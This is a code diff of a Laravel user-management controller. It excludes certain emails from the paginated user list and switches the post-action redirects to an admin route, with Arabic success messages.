@@ -18,6 +18,7 @@ class UserController extends Controller
     public function index()
     {
         $users = User::with('roles', 'profile')
+            ->whereNotIn('email', User::HIDDEN_EMAILS)
             ->paginate(10);
 
         return view('users.index', compact('users'));
@@ -74,7 +75,7 @@ class UserController extends Controller
             'user_agent' => $request->userAgent(),
         ]);
 
-        return redirect()->route('users.index')->with('success', 'User created successfully!');
+        return redirect()->route('admin.users.index')->with('toast_success', 'تم إضافة المستخدم بنجاح.');
     }
 
     /**
@@ -156,7 +157,7 @@ class UserController extends Controller
             ],
         ]);
 
-        return redirect()->route('users.show', $id)->with('success', 'User updated successfully!');
+        return redirect()->route('admin.users.index')->with('toast_success', 'تم تحديث المستخدم بنجاح.');
     }
 
     /**
@@ -199,7 +200,7 @@ class UserController extends Controller
 
         $user->delete();
 
-        return redirect()->route('users.index')->with('success', 'User deleted successfully!');
+        return redirect()->route('admin.users.index')->with('toast_success', 'تم حذف المستخدم.');
     }
 
     /**
